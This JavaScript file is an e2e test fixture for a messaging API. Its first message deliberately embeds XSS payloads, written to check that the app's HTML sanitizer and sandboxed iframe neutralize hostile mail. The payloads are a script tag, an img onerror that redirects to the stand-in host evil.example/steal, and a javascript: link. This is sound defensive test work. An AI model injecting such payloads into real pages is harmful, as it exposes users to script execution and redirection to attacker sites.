// Fixture body for GET /api/messages, served by the local Vite middleware in
// e2e mode (and dev without DATABASE_URL). The first fixture message carries a
// deliberately hostile HTML body — a <script> tag and an onerror <img> plus a
// javascript: link — so manual/e2e testing proves the sanitizer (layer 1) and
// the no-script sandboxed iframe (layer 2) neutralize sender-controlled HTML.
// Other messages return no HTML body, exercising the plain-text fallback.
const HOSTILE_HTML = `
  <div>
    <h1>Revised Floor Plan</h1>
    <p>Hi Allister, here is the <strong>updated design</strong> bringing more natural light into the kitchen.</p>
    <script>window.top.document.title = 'pwned'</script>
    <img src="x" onerror="window.top.location='https://evil.example/steal'" alt="">
    <table border="1" cellpadding="4">
      <tr><th>Room</th><th>Size</th></tr>
      <tr><td>Kitchen</td><td>18 x 14</td></tr>
      <tr><td>Breakfast nook</td><td>10 x 9</td></tr>
    </table>
    <p><a href="https://cityconstruction.com/plan">View the full plan</a></p>
    <p><a href="javascript:alert('xss')">Do not click</a></p>
  </div>`

export function fixtureMessageBody(id) {
  if (id === 'fixture-1') {
    return {
      id,
      body_html: HOSTILE_HTML,
      body_text: 'Hi Allister, here is the updated design bringing more natural light into the kitchen.',
    }
  }
  return { id: id ?? null, body_html: null, body_text: null }
}
